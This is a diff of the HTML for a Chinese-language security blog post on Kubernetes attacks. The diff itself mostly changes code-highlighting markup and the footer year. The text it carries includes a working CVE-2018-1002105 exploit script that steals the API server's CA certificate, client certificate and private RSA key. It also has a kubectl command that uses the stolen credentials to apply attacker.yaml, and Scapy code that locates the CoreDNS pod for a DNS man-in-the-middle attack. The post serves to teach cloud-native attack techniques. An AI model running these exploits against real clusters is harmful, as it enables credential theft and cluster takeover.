+</span></span><span class="line"><span class="cl">            <span class="n">_match_or_exit</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s1">&#39;stdin, stdout, stderr&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">resp</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">fail_message</span><span class="o">=</span><span class="s1">&#39;[-] Not vulnerable to CVE-2018-1002105.&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Vulnerable to CVE-2018-1002105, continue.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1"># step 2</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Getting running pods list...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">_run_with_privilege</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="s1">&#39;/runningpods/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">resp</span> <span class="o">=</span> <span class="n">_recv_all_once</span><span class="p">(</span><span class="n">ssock</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">_match_or_exit</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;HTTP/1.1 200 OK&#39;</span><span class="p">,</span> <span class="n">resp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Got running pods list.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">pods_info</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">_get_http_body</span><span class="p">(</span><span class="n">resp</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pods_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">pod</span><span class="p">[</span><span class="s1">&#39;metadata&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="k">for</span> <span class="n">pod</span> <span class="ow">in</span> <span class="n">pods_info</span><span class="p">[</span><span class="s1">&#39;items&#39;</span><span class="p">]]</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">pod</span> <span class="ow">in</span> <span class="n">pods_list</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">pod</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;kube-apiserver&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">api_server</span> <span class="o">=</span> <span class="n">pod</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Cannot find API Server.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] API Server is </span><span class="si">{</span><span class="n">api_server</span><span class="si">}</span><span class="s2">.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1"># step 3</span>
+</span></span><span class="line"><span class="cl">            <span class="n">_steal_secret</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="n">api_server</span><span class="o">=</span><span class="n">api_server</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">secret_file</span><span class="o">=</span><span class="n">ca_crt</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">match_banner</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;BEGIN CERTIFICATE&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">_steal_secret</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="n">api_server</span><span class="o">=</span><span class="n">api_server</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">secret_file</span><span class="o">=</span><span class="n">client_crt</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">match_banner</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;BEGIN CERTIFICATE&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">_steal_secret</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="n">api_server</span><span class="o">=</span><span class="n">api_server</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">secret_file</span><span class="o">=</span><span class="n">client_key</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">match_banner</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;BEGIN RSA PRIVATE KEY&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Enjoy your trip :)&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmd_try</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;kubectl --server=https://</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="si">}</span><span class="s2">&#34;</span> \
+</span></span><span class="line"><span class="cl">              <span class="sa">f</span><span class="s2">&#34; --certificate-authority=</span><span class="si">{</span><span class="n">ca_crt</span><span class="si">}</span><span class="s2">&#34;</span> \
+</span></span><span class="line"><span class="cl">              <span class="sa">f</span><span class="s2">&#34; --client-certificate=</span><span class="si">{</span><span class="n">client_crt</span><span class="si">}</span><span class="s2">&#34;</span> \
+</span></span><span class="line"><span class="cl">              <span class="sa">f</span><span class="s2">&#34; --client-key=</span><span class="si">{</span><span class="n">client_key</span><span class="si">}</span><span class="s2"> get pods -n kube-system&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">cmd_try</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -1521,8 +1521,8 @@ kubectl --token<span class="o">=</span>password --server<span class="o">=</span>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kubectl --server<span class="o">=</span>https://172.19.0.4:6443 --certificate-authority<span class="o">=</span>./ca.crt --client-certificate<span class="o">=</span>./apiserver-kubelet-client.crt --client-key<span class="o">=</span>./apiserver-kubelet-client.key apply -f attacker.yaml
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl --server<span class="o">=</span>https://172.19.0.4:6443 --certificate-authority<span class="o">=</span>./ca.crt --client-certificate<span class="o">=</span>./apiserver-kubelet-client.crt --client-key<span class="o">=</span>./apiserver-kubelet-client.key apply -f attacker.yaml
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="4-k8s-中间人攻击">4 k8s 中间人攻击</h2>
 <blockquote>
@@ -1610,8 +1610,8 @@ kubectl --token<span class="o">=</span>password --server<span class="o">=</span>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">route -n
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">route -n
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>然后直接查询 ARP 缓存，获得网桥 MAC 地址。如果没有，可以先向网桥发送一个 ARP 请求：</p>
 <div class="highlight"><div class="chroma">
@@ -1619,8 +1619,8 @@ kubectl --token<span class="o">=</span>password --server<span class="o">=</span>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">arp -n
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">arp -n
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>其次是 Core DNS Pod</strong> 的 IP 和 MAC 地址。结合背最知识部分 DNS 内容可知。pod 内部仅仅能拿到一个kube-dns 服务的 IP，通常是 10.96.0.10。但是，如果攻击者 pod 向该服务发送一个 DNS 查询请求，实际上是服务背后的 Core DNS Pod 回复 DNS 响应的（经过 DNAT 处理，目的地改为 CoreDNS Pod)。而 DNS 响应又是一个 UDP 报文，因此我们可以从中提取到 CoreDNS Pod 的 MAC 地址。但是，DNS 响应又会被进行 SNAT 处理，其中的 IP 地址被重新替换为 kube-dns 服务 IP 10.96.0.10。所以，以上步骤只能让攻击者拿到 CoreDNS Pod 的 MAC 地址。</p>
 <p>所以，攻击者可以向整个子网的每个 IP 发出 ARP 请求，收集它们的 MAC 地址，然后与前面获得的 CoreDNS Pod 的 MAC 地址进行比对，如果一致，则说明对应 IP 即为 CoreDNS Pod 的 IP。</p>
@@ -1639,17 +1639,17 @@ kubectl --token<span class="o">=</span>password --server<span class="o">=</span>
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">get_coredns_pod_mac_ip</span><span class="p">(</span><span class="n">kube_dns_svc_ip</span><span class="p">,</span> <span class="n">self_ip</span><span class="p">,</span> <span class="n">verbose</span><span class="p">):</span>
-    <span class="n">mac</span> <span class="o">=</span> <span class="n">srp1</span><span class="p">(</span><span class="n">Ether</span><span class="p">()</span> <span class="o">/</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">kube_dns_svc_ip</span><span class="p">)</span> <span class="o">/</span>
-               <span class="n">UDP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="mi">53</span><span class="p">)</span> <span class="o">/</span> <span class="n">DNS</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">qd</span><span class="o">=</span><span class="n">DNSQR</span><span class="p">()),</span> <span class="n">verbose</span><span class="o">=</span><span class="n">verbose</span><span class="p">)</span><span class="o">.</span><span class="n">src</span>
-    <span class="n">answers</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">srp</span><span class="p">(</span><span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s2">&#34;ff:ff:ff:ff:ff:ff&#34;</span><span class="p">)</span> <span class="o">/</span>
-                     <span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">{}</span><span class="s2">/24&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">self_ip</span><span class="p">)),</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="n">verbose</span><span class="p">)</span>
-    <span class="k">for</span> <span class="n">answer</span> <span class="ow">in</span> <span class="n">answers</span><span class="p">:</span>
-        <span class="k">if</span> <span class="n">answer</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">mac</span><span class="p">:</span>
-            <span class="k">return</span> <span class="n">mac</span><span class="p">,</span> <span class="n">answer</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">psrc</span>
-
-    <span class="k">return</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_coredns_pod_mac_ip</span><span class="p">(</span><span class="n">kube_dns_svc_ip</span><span class="p">,</span> <span class="n">self_ip</span><span class="p">,</span> <span class="n">verbose</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mac</span> <span class="o">=</span> <span class="n">srp1</span><span class="p">(</span><span class="n">Ether</span><span class="p">()</span> <span class="o">/</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">kube_dns_svc_ip</span><span class="p">)</span> <span class="o">/</span>
+</span></span><span class="line"><span class="cl">               <span class="n">UDP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="mi">53</span><span class="p">)</span> <span class="o">/</span> <span class="n">DNS</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">qd</span><span class="o">=</span><span class="n">DNSQR</span><span class="p">()),</span> <span class="n">verbose</span><span class="o">=</span><span class="n">verbose</span><span class="p">)</span><span class="o">.</span><span class="n">src</span>
+</span></span><span class="line"><span class="cl">    <span class="n">answers</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">srp</span><span class="p">(</span><span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s2">&#34;ff:ff:ff:ff:ff:ff&#34;</span><span class="p">)</span> <span class="o">/</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">{}</span><span class="s2">/24&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">self_ip</span><span class="p">)),</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="n">verbose</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">answer</span> <span class="ow">in</span> <span class="n">answers</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">answer</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">mac</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">mac</span><span class="p">,</span> <span class="n">answer</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">psrc</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="44-复现">4.4 复现</h3>
 <p>代码：<a href="https://github.com/Metarget/cloud-native-security-book/tree/main/code/0405-%e4%ba%91%e5%8e%9f%e7%94%9f%e7%bd%91%e7%bb%9c%e6%94%bb%e5%87%bb" target="_blank" rel="noopener noreffer">云原生网络攻击</a></p>
@@ -1659,8 +1659,8 @@ kubectl --token<span class="o">=</span>password --server<span class="o">=</span>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">docker build -t k8s_dns_mitm:1.0 .
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker build -t k8s_dns_mitm:1.0 .
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>使用 exploit.sh 分别部署 attacker 和 victim pod：</p>
 <div class="highlight"><div class="chroma">
@@ -1668,8 +1668,8 @@ kubectl --token<span class="o">=</span>password --server<span class="o">=</span>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">./exploit.sh
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./exploit.sh
+</span></span></code></pre></td></tr></table>
 </div>
 </div></div><div class="post-footer" id="post-footer">
     <div class="post-info">
@@ -1695,11 +1695,11 @@ kubectl --token<span class="o">=</span>password --server<span class="o">=</span>
     </div>
 
     <div class="post-nav"><a href="/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/" class="prev" rel="prev" title="JavaScript 反混淆"><i class="fas fa-angle-left fa-fw"></i>JavaScript 反混淆</a>
-            <a href="/2021/12/api%E5%AE%89%E5%85%A8/" class="next" rel="next" title="API 安全">API 安全<i class="fas fa-angle-right fa-fw"></i></a></div>
+            <a href="/2021/12/samaccountname-spoofing/" class="next" rel="next" title="sAMAccountName spoofing">sAMAccountName spoofing<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
